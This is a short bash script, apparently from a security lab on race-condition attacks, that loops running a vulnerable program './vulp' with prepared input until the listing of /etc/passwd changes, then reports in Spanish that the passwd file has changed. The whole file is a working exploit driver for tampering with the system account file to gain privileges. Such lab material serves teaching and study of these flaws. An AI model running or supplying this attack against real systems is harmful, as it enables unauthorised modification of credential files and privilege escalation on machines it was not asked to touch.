#!/bin/bash

PASSWD="ls -l /etc/passwd"
old=$($PASSWD)
new=$($PASSWD)
COUNT=0
while [ "$old" == "$new" ]
do
  ./vulp < pass_input
  new=$($PASSWD)  
  let COUNT=COUNT+1
  echo "running...${COUNT}"
done
echo "El archivo passwd ha cambiado"
echo $old
echo $new
exit 0
